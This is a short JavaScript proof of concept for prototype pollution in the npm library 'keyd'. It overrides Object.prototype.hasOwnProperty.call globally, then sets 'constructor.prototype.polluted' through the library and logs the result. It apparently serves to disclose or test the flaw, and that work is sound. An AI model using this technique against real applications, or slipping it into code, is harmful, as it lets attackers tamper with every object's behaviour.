Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const keyd = require('keyd');
keyd({}).set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);